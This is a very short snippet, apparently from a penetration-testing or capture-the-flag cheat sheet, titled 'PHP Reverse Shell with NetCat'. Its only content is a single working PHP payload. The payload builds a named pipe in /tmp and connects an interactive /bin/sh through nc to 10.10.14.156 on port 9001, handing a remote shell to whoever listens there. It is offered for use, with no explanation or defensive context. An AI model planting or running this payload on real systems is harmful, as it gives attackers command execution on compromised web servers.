#### PHP Reverse Shell with NetCat
```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.156 9001 >/tmp/f'); ?>
```
